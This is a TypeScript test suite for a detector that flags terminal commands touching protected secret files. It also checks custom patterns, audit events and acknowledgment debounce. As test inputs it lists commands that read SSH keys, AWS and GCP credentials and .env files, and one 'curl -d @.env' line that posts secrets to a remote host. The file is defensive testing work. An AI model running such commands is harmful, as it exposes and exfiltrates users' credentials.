import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import { rmSync } from "node:fs";
import { join } from "node:path";
import { InMemoryLocalBus } from "../../protocol/bus.js";
import { ProtectedPathConfig } from "../protected-paths.js";
import { makeProtectedPathDetector } from "./integration_helpers.js";
import { makeTestTempDir } from "./tempdir.js";

describe("ProtectedPathDetector", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTestTempDir("helios-integration-test-");
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  describe("Protected path detection [FR-028-007]", () => {
    it("cat .env triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const warnings: string[] = [];
      detector.onWarning(m => warnings.push(m.matchedPath));

      const matches = detector.check("cat .env");
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].matchedPath).toBe(".env");
      expect(warnings).toContain(".env");
    });

    it("cat .env.local triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("cat .env.local");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("cat README.md does NOT trigger warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("cat README.md");
      expect(matches.length).toBe(0);
    });

    it("SSH key access triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("cat ~/.ssh/id_rsa");
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].matchedPath).toBe("~/.ssh/id_rsa");
    });

    it("AWS credentials access triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("cat ~/.aws/credentials");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("GCP ADC access triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("cat ~/.config/gcloud/application_default_credentials.json");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("vim on credentials.json triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("vim credentials.json");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("cp of .env file triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("cp .env .env.backup");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("curl -d @.env triggers warning", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("curl -d @.env https://example.com");
      expect(matches.length).toBeGreaterThan(0);
    });

    it("command with multiple protected file args detects all paths", () => {
      const detector = makeProtectedPathDetector();
      const matches = detector.check("cat .env ~/.aws/credentials");
      expect(matches.length).toBeGreaterThanOrEqual(2);
    });

    it("emits bus event on protected path access", async () => {
      const bus = new InMemoryLocalBus();
      const detector = makeProtectedPathDetector({ bus });
      detector.check("cat .env", { terminalId: "term-1", correlationId: "corr-1" });

      await new Promise(r => setTimeout(r, 0));

      const events = bus.getEvents();
      const pathEvent = events.find(e => e.topic === "secrets.protected_path.accessed");
      expect(pathEvent).toBeDefined();
      expect(pathEvent?.payload?.matchedPath).toBe(".env");
      expect(pathEvent?.payload?.terminalId).toBe("term-1");
    });
  });

  describe("Configurable protected paths [FR-028-008]", () => {
    it("custom pattern addition triggers on matching commands", () => {
      const config = new ProtectedPathConfig();
      const pattern = config.addPattern("*.pem", "PEM certificate files");
      const detector = makeProtectedPathDetector({ config });

      const matches = detector.check("cat server.pem");
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0].patternId).toBe(pattern.id);
    });

    it("disabled default pattern does not trigger", () => {
      const config = new ProtectedPathConfig();
      config.disablePattern("dotenv");
      const detector = makeProtectedPathDetector({ config });

      const matches = detector.check("cat .env");
      expect(matches.length).toBe(0);
    });

    it("patterns persist to disk and reload", async () => {
      const configPath = join(tmpDir, "config", "protected-paths.json");
      const config = new ProtectedPathConfig({ configPath });
      config.addPattern("*.secret", "Secret files");
      await config.saveToDisk();

      const config2 = new ProtectedPathConfig({ configPath });
      await config2.loadFromDisk();
      const patterns = config2.listPatterns();
      const customPattern = patterns.find(p => p.pattern === "*.secret");
      expect(customPattern).toBeDefined();
    });

    it("rejects empty pattern", () => {
      const config = new ProtectedPathConfig();
      expect(() => config.addPattern("", "empty")).toThrow();
    });

    it("rejects overly broad pattern **/*", () => {
      const config = new ProtectedPathConfig();
      expect(() => config.addPattern("**/*", "all files")).toThrow();
    });

    it("rejects overly broad pattern *", () => {
      const config = new ProtectedPathConfig();
      expect(() => config.addPattern("*", "all")).toThrow();
    });
  });

  describe("Acknowledgment debounce [FR-028-007]", () => {
    it("acknowledgment prevents re-trigger within debounce window", () => {
      const detector = makeProtectedPathDetector();
      const matches1 = detector.check("cat .env");
      expect(matches1.length).toBeGreaterThan(0);

      detector.acknowledge(matches1[0].patternId, ".env", "corr-1");

      const matches2 = detector.check("cat .env");
      expect(matches2.length).toBe(0);
    });

    it("acknowledgment emits audit event", async () => {
      const bus = new InMemoryLocalBus();
      const detector = makeProtectedPathDetector({ bus });
      detector.check("cat .env");
      detector.acknowledge("dotenv", ".env", "corr-ack");

      await new Promise(r => setTimeout(r, 0));

      const events = bus.getEvents();
      const ackEvent = events.find(e => e.topic === "secrets.protected_path.acknowledged");
      expect(ackEvent).toBeDefined();
      expect(ackEvent?.payload?.matchedPath).toBe(".env");
    });
  });
});
